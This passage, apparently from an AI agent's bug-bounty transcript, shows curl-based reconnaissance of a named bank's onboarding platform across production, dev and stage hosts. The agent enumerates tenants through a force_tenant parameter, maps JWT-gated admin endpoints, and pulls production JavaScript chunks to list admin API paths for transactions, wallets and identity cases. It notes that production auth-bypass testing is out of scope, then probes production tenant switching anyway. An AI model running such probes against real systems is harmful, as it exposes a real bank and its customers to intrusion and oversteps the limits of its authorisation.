+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <style>
+    body {
+      background-color: #EFEFEF;
+      color: #2E2F30;
+      margin: 0;
+    }
+
+    p.error-message {
+      font-size: 40px;
+      color: #cc7b0a;
+      text-align: center;
+      fon
+=== /api/v1/tenants ===
+HTTP 403 size=28
+{"message":"Not authorized"}
+=== /api/v1/brand ===
+HTTP 200 size=6369
+{"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{"main":"#00376E","contrastText":"#FFFFFF"},"secondary":{"main":"#00376E"},"warning":{"main":"#00376E"}}},"locales":["en","de"],"page_title":"Business Control Center","tenant_symbol":"vpbanklighttenant","messages":{"en-GB":{"common-menu-userlist":"Onboarding cases","breadcrumb-use
+[0m
+Interesting. `current_user_details` 404 but brand 200. The other endpoints 404 (probably POST-only or route gated). Note that `current_user_details` returns 404 anonymous — it likely requires a session. Let me check what the login/tenant mechanism actually binds. 
+
+The key insight from the bundle: `FORCE_TENANT` is a client-controlled header that gets appended to API requests when `force_tenant` is set. This is interesting - it suggests the API supports a tenant override. But the 403 on `/api/v1/tenants` suggests authorization still gatekeeps.
+
+Let me focus on the most testable lead: the Nemotron sign_in mass-assignment probe. But first, is `POST /users/sign_in` on the LIVE prod a mutating test against live customer data? Signing in with a nonexistent test account is read-only in effect (no account creation), and can't touch customer data if it fails auth. But the program says no auth-bypass testing against live. A mass-assignment probe that tries `user[admin]=true` on sign_in is an auth-bypass test on a live production back-office.
+
+However, given this is a deep-hunt authorized program and the SPA is fully anonymous, let me consider the bounding: this is the production back-office of a bank's onboarding system. Posting forged sign_in params is an auth-bypass attempt on live infra. Per program note "no auth-bypass or mutating tests against live customer data" - I should avoid this on prod.
+
+The safer path is the **off-net dev/stage** instances: `digital-onboarding-dev.vpbank.com` and `digital-onboarding-stage.vpbank.com` which are test/sandbox. Earlier recon showed `/users/sign_in` returns 200 on dev. Let me pursue cross-tenant IDOR/mass-assignment on the **dev/stage** sandbox where the data is synthetic, mirroring the successful PSD2 sandbox BOLA approach.
+
+Let me check the dev/stage tenants.
+[0m$ [0mcd /tmp/opencode/do && for h in "digital-onboarding-dev.vpbank.com" "digital-onboarding-stage.vpbank.com"; do echo "=== $h /api/v1/brand ==="; curl -s -k -m 15 -o /tmp/opencode/do/b.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://$h/api/v1/brand"; head -c 300 /tmp/opencode/do/b.txt; echo; echo "=== $h /api/v1/tenants ==="; curl -s -k -m 15 -o /tmp/opencode/do/t.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://$h/api/v1/tenants"; head -c 300 /tmp/opencode/do/t.txt; echo; sleep 1; done
+=== digital-onboarding-dev.vpbank.com /api/v1/brand ===
+HTTP 200 size=6402
+{"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{"main":"#00376E","contrastText":"#FFFFFF"},"secondary":{"main":"#00376E"},"warning":{"main":"#00376E"}},"version":"redesign"},"locales":["en","de"],"page_title":"Business Control C
+=== digital-onboarding-dev.vpbank.com /api/v1/tenants ===
+HTTP 200 size=2
+{}
+=== digital-onboarding-stage.vpbank.com /api/v1/brand ===
+HTTP 200 size=6381
+{"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{"main":"#00376E","contrastText":"#FFFFFF"},"secondary":{"main":"#00376E"},"warning":{"main":"#00376E"}}},"locales":["en","de"],"page_title":"Business Control Center","tenant_symbol
+=== digital-onboarding-stage.vpbank.com /api/v1/tenants ===
+HTTP 200 size=2
+{}
+[0m
+Important finding! On **dev** and **stage**, `/api/v1/tenants` returns **HTTP 200 `{}`** anonymously, whereas on **prod** it returns **403 "Not authorized"**. This is a differential — dev/stage do NOT enforce per-endpoint authorization on tenants, while prod does. This confirms per-endpoint auth exists on prod but may be weaker on dev/stage.
+
+Let me probe more endpoints on dev/stage to find any that leak data. Let me enumerate the same route set on dev/stage, and test the `/admin/api/v1/users` and admin module endpoints. Let me also check the tenant-scoping: can I access another tenant's data by manipulating `force_tenant`?
+
+Let me systematically probe the discovered routes on dev/stage.
+[0m$ [0mcd /tmp/opencode/do && for p in "api/v1/users" "admin/api/v1/users" "api/v1/current_user_details" "api/v1/sessions" "api/v1/qr_codes/generate" "api/v1/sessions/idp_login" "api/v1/sessions/secure_session" "api/v1/sessions/reset_password"; do echo "=== dev /$p ==="; curl -s -k -m 15 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://digital-onboarding-dev.vpbank.com/$p"; head -c 200 /tmp/opencode/do/r.txt; echo; sleep 1; done
+=== dev /api/v1/users ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+=== dev /admin/api/v1/users ===
+HTTP 401 size=61
+{"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /api/v1/current_user_details ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+=== dev /api/v1/sessions ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+=== dev /api/v1/qr_codes/generate ===
+HTTP 401 size=48
+{"status":"2fa not enabled for provided tenant"}
+=== dev /api/v1/sessions/idp_login ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+=== dev /api/v1/sessions/secure_session ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+=== dev /api/v1/sessions/reset_password ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+[0m
+Key findings:
+- `/admin/api/v1/users` → **401 {"message":"invalid token","additional":"Nil JSON web token"}** — requires a JWT, but reveals JWT-based auth and that the endpoint exists.
+- `/api/v1/qr_codes/generate` → **401 {"status":"2fa not enabled for provided tenant"}** — leaks "2fa not enabled for provided tenant". This confirms the API reads a "tenant" context even anonymous.
+
+Let me check these on prod too for differential, and test the `force_tenant` header/param mechanism which the bundle revealed. The `qr_codes/generate` 401 with "2fa not enabled for provided tenant" suggests tenant-scoped behavior. Let me test the JWT-based admin/users endpoint and the tenant override on the dev sandbox (synthetic data).
+
+Let me look at the auth header format the bundle uses - `Authorization: Bearer <token>` was seen. And `FORCE_TENANT`. Let me test whether passing a `force_tenant` param changes tenant-scoped behavior on `/admin/api/v1/users` on dev.
+
+Given this is the dev sandbox (synthetic data), testing JWT/tenant manipulation here aligns with the authorized sandbox-testing approach used for the PSD2 BOLA. Let me probe carefully with read-only GET.
+[0m$ [0mcd /tmp/opencode/do && echo "=== dev /admin/api/v1/users with force_tenant param ==="; curl -s -k -m 15 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://digital-onboarding-dev.vpbank.com/admin/api/v1/users?force_tenant=vpbanklighttenant"; head -c 300 /tmp/opencode/do/r.txt; echo; sleep 1; echo "=== dev /api/v1/qr_codes/generate with FORCE_TENANT header ==="; curl -s -k -m 15 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" -H "FORCE_TENANT: vpbanklighttenant" "https://digital-onboarding-dev.vpbank.com/api/v1/qr_codes/generate"; head -c 300 /tmp/opencode/do/r.txt; echo
+=== dev /admin/api/v1/users with force_tenant param ===
+HTTP 401 size=61
+{"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /api/v1/qr_codes/generate with FORCE_TENANT header ===
+HTTP 401 size=48
+{"status":"2fa not enabled for provided tenant"}
+[0m
+The JWT is required regardless. So tenant override alone isn't enough without a token. The 401 tells us JWT auth gates these.
+
+Let me reconsider. The login flow itself is the gate. Let me examine the sign_in mechanism on the dev sandbox more carefully — a mass-assignment probe on the **dev/stage** sandbox (synthetic data) is the authorized, safe approach. Let me look at the sign_in form on the control-center SPA and understand the login request format from the bundle.
+
+Let me find the login POST endpoint used by the SPA. Earlier we saw `/users/sign_in` (Devise, HTML) returns 200. But the SPA uses an API-based login via `/api/v1/sessions` (JSON). Let me look at the session auth module in the bundle to find the actual login request.
+
+Let me extract the auth/login module code.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,120}(DD=|LOGIN:|getAuthToken|setAuthToken|Authorization-Invalid).{0,200}' index.js | head -20
+Config")&&wte("printConfig")&&console.log("production",JSON.stringify(dV,null,4));const It={get:wte,has:hV},LW={INVALID_LOGIN:"INVALID_LOGIN",USER_BLOCKED:"USER_BLOCKED"},tg={OTP_CHALLENGE:"[401]: otp_challenge",INVALID_LOGIN:"[401]: email or password incorrect",OTP_CHALLENGE_FAILED:"[401]: otp_challenge_failed",OTP_CHALLENG
+et,JV=KV.remove,tGe=YV.get,yre=YV.set,ZV=YV.remove,QV=qV.remove,nGe=Object.freeze(Object.defineProperty({__proto__:null,getAuthToken:gre,getCustomizations:hre,getModuleCustomizations:pre,getModules:jG,getUsername:tGe,removeAuthToken:XV,removeCustomizations:QV,removeModules:JV,removeUsername:ZV,setAuthToken:mre,setCustomizations:fr
+Details:{},customizations:{login_redirect:!1}}),iGe=()=>Cp({},rGe(),{customizations:pre("user")}),Cre=e=>e?.user||e||{},DD="LOGIN",FD="LOGOUT",e4="LOGINIDP",wre="DISMISS_LOGIN_ERROR",t4="FETCH_LOGIN_REQUEST",ST="FETCH_LOGIN_SUCCESS",OD="FETCH_LOGIN_FAILURE",n4="FETCH_IDP_LOGIN_REQUEST",ET="FETCH_IDP_LOGIN_SUCCESS",LD="FET
+E_SESSION_SUCCESS:xv,FETCH_UPDATE_PASSWORD_FAILURE:d4,FETCH_UPDATE_PASSWORD_REQUEST:c4,FETCH_UPDATE_PASSWORD_SUCCESS:u4,LOGIN:DD,LOGINIDP:e4,LOGOUT:FD,SET_AVAILABLE_MODULES:ND,SET_AVAILABLE_ROUTES:kD,SET_IDP_TOKEN_PROCESSED:r4},Symbol.toStringTag,{value:"Module"})),Sre=()=>"/api/v1/sessions",sGe=()=>"/users/password",aGe=()=
+},{method:t,headers:r?.noDefaultHeaders?{}:{Accept:"application/json","Content-Type":"application/json"}},r);const a=oy.getAuthToken();s.headers?.Authorization||a&&(Mf("adding token",null,"optional"),s.headers.Authorization=`Bearer ${a}`),n&&(Mf("adding body",null,"optional"),s={...s,body:n}),Mf("fetch",{url:i,options:s},"info");c
+s}] - ${l.statusText}`,h,"error"),new $Ue(`${l.status}${h?" - "+h:""}`,h,l.status,l.statusText,l.url)}if(l.headers.get("Authorization-Invalid"))throw new Error("401 - invalid token");const u=l.headers.get("Authorization");if(u&&u!==a&&(Mf("new token",null,"info"),oy.setAuthToken(u)),s.responseType==="blob"){const h=await l.blob();Mf("respo
+const roe="CALL_API_XHRUPLOAD";function s6e(e,{path:t,...n}){return new Promise((r,i)=>{const o=new XMLHttpRequest,s=oy.getAuthToken(),a=()=>{if(o.status>=400)return l();const v=o.getResponseHeader("Authorization");return v&&v!==s&&oy.setAuthToken(v),r(o.responseText)},l=()=>{const f=o.responseText,v=o.status,y=new C4(`${v}${f&&" 
+tinueTrigger,onForgotPasswordClick:()=>F(),onSubmit:I}),[h,f,d,v,e,F,I]),W=V.useCallback(()=>{switch(t){case LW.INVALID_LOGIN:return M.jsx(n3,{"data-testid":"login-invalid",children:b.formatMessage({id:"ecosystem-login-invalid"})});case LW.USER_BLOCKED:return M.jsx(n3,{"data-testid":"login-invalid-user-blocked",children:b.fo
+[0m
+I now have a good understanding of the auth flow:
+- Login POSTs to `/api/v1/sessions` with email/password, gets back a JWT (`Authorization` response header carries `Bearer <token>`), plus OTP challenge flow, and there's an IDP login (`/api/v1/sessions/idp_login`) for SSO.
+- `FORCE_TENANT` is a client-controlled header/param.
+- The `/admin/api/v1/users` endpoint is JWT-gated.
+
+The sign_in mass-assignment probing on production is an auth-bypass attempt against live customer data — out of scope per program note. But on the **dev/stage sandbox** (synthetic data), this is the authorized approach.
+
+Let me examine the `/users/sign_in` Devise form (the nemotron hypothesis targets this specifically on prod). But on the dev sandbox, the anonymous /control-center SPA uses `/api/v1/sessions`. Let me probe the **dev** login flow in a read-only, non-mutating way (POST would create a session attempt but with fake creds it just returns INVALID_LOGIN — no data exposure, no account creation).
+
+Actually, let me reconsider the highest-value, in-scope, safe vector here. The most promising confirmed finding is the **dev/stage `/api/v1/tenants` returning 200 while prod returns 403** — an authorization differential on a *multi-tenant management* endpoint. Let me dig into what data `/api/v1/tenants` returns and whether it leaks other tenants on dev/stage.
+
+Currently it returns `{}` - empty. Let me check with force_tenant and different tenant ids to see if tenant enumeration reveals other tenants' configs.
+
+Let me test the tenant list on dev/stage more thoroughly, and also the `/api/v1/brand` for other tenant ids (brand returned `vpbanklighttenant` - are there other tenants?).
+[0m$ [0mcd /tmp/opencode/do && for ten in "vpbanklighttenant" "vpbank" "vp" "vpbankdarktenant" "testtenant" "default"; do echo "=== dev brand?force_tenant=$ten ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} " "https://digital-onboarding-dev.vpbank.com/api/v1/brand?force_tenant=$ten"; head -c 120 /tmp/opencode/do/r.txt; echo; sleep 1; done
+=== dev brand?force_tenant=vpbanklighttenant ===
+HTTP 200 size=6402 {"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+=== dev brand?force_tenant=vpbank ===
+HTTP 200 size=6380 {"id":"vpbank","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{"main":"#00
+=== dev brand?force_tenant=vp ===
+HTTP 200 size=6402 {"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+=== dev brand?force_tenant=vpbankdarktenant ===
+HTTP 200 size=6402 {"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+=== dev brand?force_tenant=testtenant ===
+HTTP 200 size=6402 {"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+=== dev brand?force_tenant=default ===
+HTTP 200 size=6402 {"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+[0m
+**Major finding!** On the dev sandbox, `?force_tenant=vpbank` returns a **different tenant config** (`id: vpbank`, size 6380, company VP BANK AG, different theme `#00...`). The `force_tenant` parameter **selects a different tenant's brand config anonymously** — a confirmed cross-tenant enumeration vector. `vpbank` is a real, distinct tenant (different primary font color and theme, size difference).
+
+This is a cross-tenant information disclosure — on the dev sandbox. The `force_tenant` client-controlled param switches tenant context. If the same param influences data-scoped endpoints (users, onboarding cases, transactions), then a tenant-scoped read or even write could cross tenants.
+
+Let me confirm `vpbank` is a distinct tenant and probe whether any *data* endpoint respects force_tenant on dev/stage. Let me check the tenants list on dev with more, and try the admin/users endpoint variations. Also let me check whether prod's `force_tenant=vpbank` also reveals the second tenant.
+
+Let me check prod and stage for the same force_tenant differential.
+[0m$ [0mcd /tmp/opencode/do && for h in "digital-onboarding.vpbank.com" "digital-onboarding-stage.vpbank.com"; do echo "=== $h brand?force_tenant=vpbank ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://$h/api/v1/brand?force_tenant=vpbank"; head -c 200 /tmp/opencode/do/r.txt; echo; sleep 1; echo "=== $h brand (no param) ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://$h/api/v1/brand"; head -c 120 /tmp/opencode/do/r.txt; echo; sleep 1; done
+=== digital-onboarding.vpbank.com brand?force_tenant=vpbank ===
+HTTP 200 size=6347
+{"id":"vpbank","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{"main":"#00376E","contrastText":"#FFFFFF"},"secondary":{"main":"#00376E"},"warning":{"main"
+=== digital-onboarding.vpbank.com brand (no param) ===
+HTTP 200 size=6369
+{"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+=== digital-onboarding-stage.vpbank.com brand?force_tenant=vpbank ===
+HTTP 200 size=6359
+{"id":"vpbank","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{"main":"#00376E","contrastText":"#FFFFFF"},"secondary":{"main":"#00376E"},"warning":{"main"
+=== digital-onboarding-stage.vpbank.com brand (no param) ===
+HTTP 200 size=6381
+{"id":"vpbanklighttenant","company":"VP BANK AG","theme":{"typography":{"fontFamily":["Poppins"]},"palette":{"primary":{
+[0m
+[0m$ [0mcd /tmp/opencode/do && grep -oE '\(\)=>"[^"]{2,90}"' index.js | sort -u | grep -viE 'asset|\.svg|\.png|\.css|\.jsx|\.ts|images/|fonts' | head -60
+()=>"'seriesChartTypes' are required when the 'customCombo' chart type is specified."
+()=>"/admin/api/v1/users"
+()=>"/api/v1/brand"
+()=>"/api/v1/current_user_details"
+()=>"/api/v1/qr_codes/generate"
+()=>"/api/v1/sessions"
+()=>"/api/v1/sessions/idp_login"
+()=>"/api/v1/sessions/reset_password"
+()=>"/api/v1/sessions/secure_session"
+()=>"/api/v1/tenants"
+()=>"/rails/active_storage/direct_uploads"
+()=>"/users/password"
+()=>"Advanced Filter is only supported with the Client-Side Row Model or Server-Side Row Model."
+()=>"AnimationFrameService called but animation frames are off"
+()=>"As of v32, using custom components with `reactiveCustomComponents = false` is deprecated."
+()=>"As of v33, `column.isHovered()` is deprecated. Use `api.isColumnHovered(column)` instead."
+()=>"As of v34, use (`api.getColumnFilterModel()`) instead."
+()=>"As of v34, use (`api.setColumnFilterModel()`) instead."
+()=>"Browser does not support document.execCommand('copy') for clipboard operations"
+()=>"Calling gridApi.resetRowHeights() makes no sense when using Auto Row Height."
+()=>"Cannot create chart: no chart themes available."
+()=>"Changing the column pinning status is not allowed with domLayout='print'"
+()=>"Column Filter API methods have been disabled as Advanced Filters are enabled."
+()=>"Could not find document body, it is needed for drag and drop and context menu."
+()=>"Data type of the new value does not match the cell data type of the column"
+()=>"DateFilter minValidDate should be <= maxValidDate"
+()=>"DateFilter minValidYear should be <= maxValidYear"
+()=>"Export cancelled. Export is not allowed as per your configuration."
+()=>"Failed to deserialize state - Every `toggledNode` requires an associated string id."
+()=>"Failed to deserialize state - `selectAllChildren` must be a boolean value or undefined."
+()=>"Failed to deserialize state - `toggledNodes` must be an array."
+()=>"Failed to deserialize state - each provided state object must be an object."
+()=>"Filter is missing isFilterActive() method"
+()=>"Filter is missing method doesFilterPass"
+()=>"Filter model is missing 'conditions'"
+()=>"Group Column Filter only works on group columns. Please use a different filter."
+()=>"Infinite scrolling must be enabled in order to set the row count."
+()=>"Invalid params supplied to createExcelFileForExcel() - `ExcelExportParams.data` is empty."
+()=>"Invalid selection state. The state must conform to `IServerSideSelectionState`."
+()=>"MultiFloatingFilterComp expects MultiFilter as its parent"
+()=>"Must supply a Value Formatter in Set Filter params when using a Key Creator"
+()=>"New filter tool panel requires `enableFilterHandlers: true`."
+()=>"No active charts to update."
+()=>"No gridOptions provided to createGrid"
+()=>"Row Numbers Row Resizer cannot be used when Grid Columns have `autoHeight` enabled."
+()=>"Row selection features are not available unless `rowSelection` is enabled."
+()=>"SetFloatingFilter expects SetFilter as its parent"
+()=>"There is no `window` associated with the current `document`"
+()=>"Transactions aren't supported with tree data when using treeDataChildrenField"
+()=>"UNKNOWN"
+()=>"Unable to add data table to Excel sheet: A table already exists."
+()=>"Unable to add data table to Excel sheet: Missing required parameters."
+()=>"Unable to initialise. See validation error, or load ValidationModule if missing."
+()=>"Unable to instantiate filter"
+()=>"Unknown button type specified"
+()=>"Using both rowData and v-model. rowData will be ignored."
+()=>"When `masterSelects: 'detail'`, detail grids must be configured with multi-row selection"
+()=>"`api.doFilterAction()` requires `enableFilterHandlers = true"
+()=>"`api.getColumnFilterModel(key, true)` requires `enableFilterHandlers = true"
+()=>"`rowData` must be an array"
+[0m
+Confirmed: `force_tenant=vpbank` switches tenant context anonymously on **prod, dev, and stage**. This validates the client-controlled `FORCE_TENANT` mechanism as real on production. Now the key question: does `force_tenant` scope **data** endpoints (not just brand config)? Let me extract the data endpoint paths from the module ducks in the bundle.
+[0m$ [0mcd /tmp/opencode/do && grep -oE 'assets/[a-zA-Z0-9_/-]+\.js' index.js | sort -u | head -60
+assets/AccountBalance-l-U9mtqT.js
+assets/Article-BSfuArb2.js
+assets/Box-CIe08WFf.js
+assets/Button-C97s4SxR.js
+assets/CloudUpload-C5Q4JIyJ.js
+assets/ComplianceDialog-G2Sv5Zp5.js
+assets/DownloadCenter-o41XdkIf.js
+assets/Edit-BXZ_sBL4.js
+assets/EmailDialog-Cg8U2Sxa.js
+assets/Gesture-CIxvuxKl.js
+assets/Heading-DSMmb_m7.js
+assets/RadioGroupRow-D_7ArbNB.js
+assets/Search-DsEG7ZN6.js
+assets/SelectDefault-CsFxc7OE.js
+assets/Table-Sticky-Header-UNO5zGVP.js
+assets/TableContainer-CNtBUyOM.js
+assets/TableRow-F7jZiL_x.js
+assets/TableRowWithAlternatingColor-BxLFTPPD.js
+assets/decimal-CaUHonIL.js
+assets/devexpressCellMappers-DqKLZUUN.js
+assets/duck--CSNSg6J.js
+assets/duck-B7kZJ91_.js
+assets/duck-B8tH2-XL.js
+assets/duck-BOfJXCjo.js
+assets/duck-Bps61Bwe.js
+assets/duck-C21NH2nH.js
+assets/duck-CGaHv26n.js
+assets/duck-CgNrhV64.js
+assets/duck-CubE8QTH.js
+assets/duck-D99P7ghZ.js
+assets/duck-DN-TDdpU.js
+assets/duck-DPln7q39.js
+assets/duck-DPzH84ew.js
+assets/duck-DS5N7Djh.js
+assets/duck-DSD41jYZ.js
+assets/duck-DWxPQRsW.js
+assets/duck-DYw8WxTc.js
+assets/duck-D_VDzBpH.js
+assets/duck-DpYf8Jwo.js
+assets/duck-HXyLf-up.js
+assets/duck-Xa9-bmb8.js
+assets/duck-YN3AAbhD.js
+assets/duck-mebH_bqC.js
+assets/duck-nW5zOEFN.js
+assets/duck-x8cqs2S2.js
+assets/finalformDecorator-C7g2DNv2.js
+assets/handleDatagridChanges-C9kHFPt0.js
+assets/index-DANNJLpy.js
+assets/index-tOQMwNKV.js
+assets/polyfill-D0lzYJbE.js
+assets/polyfill-DBB4saN2.js
+assets/polyfill-MGrBVmKs.js
+assets/polyfill-qjxz8etT.js
+assets/processTableColumn-C1KVKnV_.js
+assets/useAgGridAdditionalColumns-c3Q_U2UK.js
+assets/useAgGridApiRef-DfMTNY2w.js
+assets/useAgGridContainerSetup-Bn1J7u_y.js
+assets/useApiControlledFilterOptions-BjCHvaBn.js
+assets/useDispatch-Cb9JOBL1.js
+assets/useGridActionHandlers-DEhZy8bI.js
+[0m
+The main bundle only defines the base API endpoints. All the specific data endpoints (onboarding cases, banking transactions, etc.) live in lazily-loaded chunk files with paths like `/api/v1/...`. The module files referenced (`/src/modules/bankingtransactions/duck.js`, etc.) are in separate chunks. Let me find and fetch those chunks.
+
+Let me extract chunk URLs from the bundle.
+There are many duck chunks. The `index-DANNJLpy.js` and `index-tOQMwNKV.js` might be the module index files. Let me fetch the duck chunks and search for API endpoint paths. Let me get the index chunks first, and then grab all the `duck-*.js` chunks which contain the module endpoint definitions.
+[0m$ [0mcd /tmp/opencode/do && for f in "index-DANNJLpy.js" "index-tOQMwNKV.js" "duck--CSNSg6J.js" "duck-B7kZJ91_.js" "duck-B8tH2-XL.js" "duck-BOfJXCjo.js" "duck-Bps61Bwe.js"; do curl -s -k -m 20 -o "chunk_$f" -w "$f %{http_code} %{size_download}\n" "https://digital-onboarding.vpbank.com/control-center/assets/$f"; done
+index-DANNJLpy.js 200 3305
+index-tOQMwNKV.js 200 43803
+duck--CSNSg6J.js 200 55080
+duck-B7kZJ91_.js 200 197913
+duck-B8tH2-XL.js 200 13563
+duck-BOfJXCjo.js 200 25918
+duck-Bps61Bwe.js 200 14468
+[0m
+[0m$ [0mcd /tmp/opencode/do && for f in chunk_*.js; do grep -oE '"/(api|admin|control-center)/[a-zA-Z0-9_/${}.:-]{2,80}"' "$f" | sed "s|^|[$f] |"; done | sort -u | head -80
+[chunk_duck--CSNSg6J.js] "/admin/api/v1/rights_and_roles/admin_users"
+[chunk_duck--CSNSg6J.js] "/admin/roleadminlist"
+[chunk_duck-B7kZJ91_.js] "/admin/dynconfbrowser"
+[chunk_duck-B7kZJ91_.js] "/admin/dynconfs"
+[chunk_duck-B8tH2-XL.js] "/admin/api/v1/rights_and_roles/users"
+[chunk_duck-B8tH2-XL.js] "/admin/roleuserlist"
+[chunk_duck-BOfJXCjo.js] "/admin/api/v1/rights_and_roles/tenant_variant_groups"
+[chunk_duck-Bps61Bwe.js] "/admin/api/v1/wallet_accounts"
+[chunk_duck-Bps61Bwe.js] "/admin/walletibans"
+[chunk_duck-Bps61Bwe.js] "/admin/walletibans/:id"
+[0m
+Let me fetch all remaining duck chunks and extract all endpoint paths. Let me grab them all.
+[0m$ [0mcd /tmp/opencode/do && for f in "duck-C21NH2nH.js" "duck-CGaHv26n.js" "duck-CgNrhV64.js" "duck-CubE8QTH.js" "duck-D99P7ghZ.js" "duck-DN-TDdpU.js" "duck-DPln7q39.js" "duck-DPzH84ew.js" "duck-DS5N7Djh.js" "duck-DSD41jYZ.js" "duck-DWxPQRsW.js" "duck-DYw8WxTc.js" "duck-D_VDzBpH.js" "duck-DpYf8Jwo.js" "duck-HXyLf-up.js" "duck-Xa9-bmb8.js" "duck-YN3AAbhD.js" "duck-mebH_bqC.js" "duck-nW5zOEFN.js" "duck-x8cqs2S2.js"; do curl -s -k -m 20 -o "chunk_$f" -w "$f %{http_code} %{size_download}\n" "https://digital-onboarding.vpbank.com/control-center/assets/$f"; sleep 0.5; done
+duck-C21NH2nH.js 200 32960
+duck-CGaHv26n.js 200 44736
+duck-CgNrhV64.js 200 33238
+duck-CubE8QTH.js 200 26601
+duck-D99P7ghZ.js 200 51034
+duck-DN-TDdpU.js 200 28184
+duck-DPln7q39.js 200 110068
+duck-DPzH84ew.js 200 6666
+duck-DS5N7Djh.js 200 9011
+duck-DSD41jYZ.js 200 25098
+duck-DWxPQRsW.js 200 6025
+duck-DYw8WxTc.js 200 34242
+duck-D_VDzBpH.js 200 70
+duck-DpYf8Jwo.js 200 301707
+duck-HXyLf-up.js 200 50740
+duck-Xa9-bmb8.js 200 24037
+duck-YN3AAbhD.js 200 22789
+duck-mebH_bqC.js 200 237601
+duck-nW5zOEFN.js 200 13234
+duck-x8cqs2S2.js 200 2541
+[0m
+[0m$ [0mcd /tmp/opencode/do && for f in chunk_*.js; do grep -oE '"/(api|admin)/[a-zA-Z0-9_/${}.:-]{2,80}"' "$f" | sed "s|^|[$f] |"; done | sort -u
+[chunk_duck--CSNSg6J.js] "/admin/api/v1/rights_and_roles/admin_users"
+[chunk_duck--CSNSg6J.js] "/admin/roleadminlist"
+[chunk_duck-B7kZJ91_.js] "/admin/dynconfbrowser"
+[chunk_duck-B7kZJ91_.js] "/admin/dynconfs"
+[chunk_duck-B8tH2-XL.js] "/admin/api/v1/rights_and_roles/users"
+[chunk_duck-B8tH2-XL.js] "/admin/roleuserlist"
+[chunk_duck-BOfJXCjo.js] "/admin/api/v1/rights_and_roles/tenant_variant_groups"
+[chunk_duck-Bps61Bwe.js] "/admin/api/v1/wallet_accounts"
+[chunk_duck-Bps61Bwe.js] "/admin/walletibans"
+[chunk_duck-Bps61Bwe.js] "/admin/walletibans/:id"
+[chunk_duck-C21NH2nH.js] "/admin/bankingtransactions"
+[chunk_duck-C21NH2nH.js] "/admin/bankingtransactions/:id/:process_id"
+[chunk_duck-CGaHv26n.js] "/admin/api/v1/rights_and_roles/tenant_variants"
+[chunk_duck-CGaHv26n.js] "/admin/organizationlist"
+[chunk_duck-CgNrhV64.js] "/admin/aiowallet"
+[chunk_duck-CgNrhV64.js] "/admin/aiowallet/:id/:process_id"
+[chunk_duck-CgNrhV64.js] "/admin/api/v1/wallet_accounts"
+[chunk_duck-CgNrhV64.js] "/admin/walletibans"
+[chunk_duck-CubE8QTH.js] "/admin/api/v1/ident_only_cases"
+[chunk_duck-CubE8QTH.js] "/admin/identlist"
+[chunk_duck-CubE8QTH.js] "/admin/identlist/user/"
+[chunk_duck-CubE8QTH.js] "/admin/identlist/user/:id"
+[chunk_duck-D99P7ghZ.js] "/admin/api/v1/search/agree21"
+[chunk_duck-D99P7ghZ.js] "/admin/clientsearch"
+[chunk_duck-DN-TDdpU.js] "/admin/api/v1/users/process_list"
+[chunk_duck-DN-TDdpU.js] "/admin/processlist"
+[chunk_duck-DN-TDdpU.js] "/admin/processlist/process/:id/:process_context"
